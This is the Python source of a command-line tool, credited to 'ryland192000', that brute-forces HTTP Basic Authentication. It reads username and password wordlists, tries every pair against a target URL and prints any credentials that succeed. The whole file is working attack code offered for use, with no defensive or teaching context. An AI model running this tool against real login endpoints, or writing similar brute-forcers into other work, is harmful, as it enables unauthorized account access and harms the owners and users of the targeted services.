import re,sys,os,base64,optparse
from time import sleep
try:
    import requests
except ImportError:
    print('error - please have the module "requests" installed.')
    sys.exit(1)

class txt:
    y = '\033[93m'
    b = '\033[1m'
    u = '\033[4m'
    e = '\033[0m'
parser = optparse.OptionParser()

parser.add_option('-u', '--usernames',
    action = "store", dest = "usernames",
    help = "file containing potential usernames", default = "wlan0")
parser.add_option('-p', '--passwords',
    action = "store", dest = "passwords",
    help = "file containing potential passwords", default = "")
parser.add_option('-r', '--url',
    action = "store", dest = "url",
    help = "url we are bruteforcing", default = "")

options,args = parser.parse_args()

def header():
    sys.stdout.write("""{}
       _     _         
     _| |___|_|___ _ _ 
    | . | .'| |_ -| | |
    |___|__,|_|___|_  |
                  |___|{}
   basic auth brute tool
  by ryland192000 // v1.0 {}   
  
""".format(txt.y,txt.b,txt.e))

def basicAuthRequest(url, username, password):
    try:
        string = base64.encodestring(('%s:%s' % (username,password)).encode()).decode().replace('\n', '')
        request = requests.get(url,headers={'Authorization': 'Basic {}'.format(string)})
        if request.status_code == 200:
            print('''{}
     Credentials Found!

        [ Username ]
        > {}
        [ Password ]
        > {} {}
'''.format(txt.b,username, password,txt.e))
    except:
        pass


def basicAuthAttack():
    print('{}Cracking {}...{}'.format(txt.y,options.url,txt.e))
    users = options.usernames
    passes = options.passwords
    usernames = []
    passwords = []
    url = options.url   
    #read files
    if os.path.isfile(users) and os.path.isfile(passes):
        with open(users, 'r') as userFile:
            for line in userFile:
                line = line.strip()
                usernames.append(line)
        with open(passes, 'r') as passFile:
            for line in passFile:
                line = line.strip()
                passwords.append(line)
    else:
        print("{}Error:{} Could not find file(s)".format(txt.b,txt.e))
    sleep(1)
    try:
        for usr in usernames:
            for pwd in passwords:
                basicAuthRequest(url,usr,pwd)
    except KeyboardInterrupt:
        sys.exit(1)
if __name__ == "__main__":      
    header()
    basicAuthAttack()


